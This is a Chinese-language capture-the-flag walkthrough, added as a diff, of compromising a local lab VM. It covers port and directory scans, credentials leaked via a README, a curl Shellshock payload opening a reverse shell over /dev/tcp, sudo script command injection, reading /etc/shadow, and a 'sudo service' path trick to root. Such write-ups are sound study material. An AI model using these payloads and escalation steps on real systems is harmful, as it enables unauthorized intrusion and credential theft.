@@ -1,0 +1,177 @@
+#ip
+192.168.1.26
+
+nmap -sS -P0 -A 192.168.1.26 
+# Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 20:04 CST
+# Nmap scan report for 192.168.1.26
+# Host is up (0.00016s latency).
+# Not shown: 997 closed tcp ports (reset)
+# PORT   STATE    SERVICE VERSION
+# 21/tcp filtered ftp
+# 22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+# | ssh-hostkey: 
+# |   2048 3736603e26ae233fe18b5d18e7a7c7ce (RSA)
+# |   256 349a57607d6670d5b5ff4796e0362375 (ECDSA)
+# |_  256 ae7deefe1dbc994d54453d6116f86c87 (ED25519)
+# 80/tcp open     http    Apache httpd 2.4.38 ((Debian))
+# |_http-server-header: Apache/2.4.38 (Debian)
+# |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+# MAC Address: 08:00:27:5C:B2:63 (Oracle VirtualBox virtual NIC)
+# Device type: general purpose
+# Running: Linux 4.X|5.X
+# OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+# OS details: Linux 4.15 - 5.6
+# Network Distance: 1 hop
+# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+dirsearch -u http://192.168.1.26/
+# [20:09:44] 200 -    4KB - /README.md                                        
+# [20:09:46] 302 -    7KB - /admin_home.php  ->  home.php                     
+# [20:09:46] 200 -    1KB - /admin_login.php                                  
+# [20:09:49] 403 -  277B  - /cgi-bin/                                         
+# [20:09:49] 200 -    4KB - /contact.php                                      
+# [20:09:51] 301 -  312B  - /fonts  ->  http://192.168.1.26/fonts/            
+# [20:09:52] 200 -  472B  - /header.php                                       
+# [20:09:52] 200 -    5KB - /home.php                                         
+# [20:09:52] 301 -  313B  - /images  ->  http://192.168.1.26/images/          
+# [20:09:52] 200 -    4KB - /images/
+# [20:09:52] 200 -    5KB - /index.php                                        
+# [20:09:52] 200 -    5KB - /index.php/login/                                 
+# [20:09:55] 200 -    8KB - /news.php 
+
+#查看 README.md 页面
+发现 mysql 数据库文件 net_banking.sql
+#管理员密码帐号
+admin/password123
+
+#登录管理员页面
+http://192.168.1.26/admin_login.php
+# admin/password123
+#登录成功
+
+#貌似没发现能 getshell 的地方，获取 游客 的帐号密码
+zakee94/nafees123
+salman/salman123
+tushar/tushar123
+jon/snow123
+
+#访问cgi-bin目录
+http://192.168.1.26/cgi-bin/  #返回500，就证明可以访问，只是缺少参数，403表示没权限访问
+
+#dirsearch 扫描 cgi-bin 目录
+dirsearch -u http://192.168.1.26/cgi-bin/ -f -e cgi,sh
+# [23:17:25] 500 -  610B  - /cgi-bin/backup.cgi                               
+# [23:17:40] 500 -  610B  - /cgi-bin/shell.sh   
+
+#测试是否存在漏洞
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 192.168.1.26
+或者
+nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.1.26
+# PORT   STATE SERVICE VERSION
+# 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+# | http-shellshock: 
+# |   VULNERABLE:
+# |   HTTP Shellshock vulnerability
+# |     State: VULNERABLE (Exploitable)
+# |     IDs:  CVE:CVE-2014-6271
+# |       This web application might be affected by the vulnerability known
+# |       as Shellshock. It seems the server is executing commands injected
+# |       via malicious HTTP headers.
+# |             
+# |     Disclosure date: 2014-09-24
+# |     Exploit results:
+  
+#测试两个文件 都存在 http-shellshock 漏洞
+
+#利用漏洞获得 reverse shell
+kali攻击机  nc -lvnp 4444
+靶机  
+curl http://192.168.1.26/cgi-bin/backup.cgi -A "() { :; }; /bin/bash -c '/bin/bash -i 
+>& /dev/tcp/192.168.1/4444 0>&1'"
+# payload () { :; }; 的空格必须要注意不能少，少了不能成功执行
+
+#获得shell
+bash-4.3$
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+普通用户 thor 提权:
+#sudo -l  查看可以使用命令
+thor) NOPASSWD  /home/thor/./hammer.sh
+#我们可以不用用户密码 执行 /home/thor/./hammer.sh
+
+#执行 sh 脚本
+sudo -u thor /home/thor/./hammer.sh
+
+#输入命令的脚本 测试
+id
+#无效输出
+id
+# uid=1001(thor) gid=1001(thor) groups=1001(thor)
+#输入的第二个id 当成普通用户权限执行了
+
+#我们可以把第二个 id  换成 /bin/bash ， 这样就可以获得用户权限的  shell
+id
+#无效输出
+/bin/bash
+# 空白 用户shell
+
+#稳定shell
+export TERM=xterm
+python3 -c "import pty;pty.spawn('/bin/bash')"
+# thor@HacksudoThor:/home$ 
+
+#获得 user flag
+user owned
+
+root提权:
+#sudo -l 查看可用命令
+(root) NOPASSWD /usr/bin/cat, /usr/sbin/service
+
+#上面两个命令 不用root的密码
+sudo cat /etc/shadow
+#root:$6$1YV0h.2rYTAvcB.o$cLPgAevmbnBo8dtADheWYcIfGLg1
+#57gfrCzZsKqv268MDkimBW7JcnQK6sI79fXsa1Hm5GmP8Kni05w.2nJfc0:18838:0:99999:7:::
+#破解密码非常慢
+
+#使用service命令 执行一个/bin/bash
+sudo service ../../bin/bash  #这里必须要 ../../   默认从用户目录开始，需要回退两次到 / 目录
+#bash-4.3#
+
+#id
+uid=0(root) gid=0(root) groups=0(root)
+
+#获得 root flag
+rooted
+
+#全部完成
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
